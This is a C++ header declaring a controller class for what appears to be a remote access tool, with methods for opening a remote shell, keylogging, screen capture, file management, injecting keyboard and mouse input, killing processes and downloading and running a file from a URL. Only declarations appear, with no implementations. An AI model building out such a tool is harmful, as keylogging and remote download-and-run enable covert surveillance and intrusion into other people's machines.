#pragma once

#include "connectbase.h"
#include <vector>
class CGetTransmitTime
{
	DWORD* m_dwT;
public:
	CGetTransmitTime(DWORD* t)
	{
		m_dwT = t;
		*m_dwT = GetTickCount();
	}
	~CGetTransmitTime()
	{
		*m_dwT = GetTickCount() - *m_dwT;
	}
};
class CServerConnectHandle :
	public CConnectBase
{
public:
	CServerConnectHandle(void);
	~CServerConnectHandle(void);
	tagServerSystemInfo m_SystemInfo;

	DWORD m_dwIp;
	std::wstring m_strAddr;
	DWORD m_dwLastCmd ;
	DWORD m_dwCareer;  //ËÙ¶È
//public:

//	WCHAR szPassWord[30];
public:
	void SetServerInfoAtThis(tagServerSystemInfo* pInfo);
	bool SetServerInfo(tagServerSystemInfo* pInfo);
	void GetServerInfoAtThis(tagServerSystemInfo* pInfo);
	bool GetServerInfo(tagServerSystemInfo* pInfo);
	
/////////////////////////////////////////////
	bool GetShell();
	DWORD GetScreenInput();
	bool GetCap();
	bool GetFileManage();
	bool GetServerKeyLog();
////////////////////////////////////////////
	bool SendKeyDown(int nVirtKey);
	bool SendKeyUp(int nVirtKey);
	bool SendMouseMove(POINT* pt);
	bool SendLButtonDown();
	bool SendLButtonUp();
	bool SendLButtonDblclk();
	bool SendRButtonDown();
	bool SendRButtonUp();
	bool SendRButtonDblclk();
	bool SendKeyCtrlAltDel();

//////////////////////////////////////////
	DWORD GetProcessList(std::vector<tagVipShellProcess>* pVecTor);
	bool KillProcess(DWORD dwId);
	
	bool DownFileAndRun(LPCTSTR szUrl);
	bool SetServerExplain(LPCTSTR sz);
};
